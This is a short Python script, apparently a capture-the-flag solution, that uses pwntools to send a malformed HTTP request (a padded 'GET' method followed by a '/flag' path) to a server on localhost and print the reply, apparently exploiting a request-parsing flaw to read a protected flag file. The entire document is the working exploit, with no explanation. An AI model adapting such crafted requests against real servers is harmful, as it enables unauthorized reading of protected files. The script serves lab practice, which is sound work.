from pwn import remote

with remote("localhost", 8000) as io:
    io.send(b"GET" + b"a" * 13 + b"/flag / HTTP/1.1\r\n\r\n")
    print(io.clean(1).decode("utf-8"))
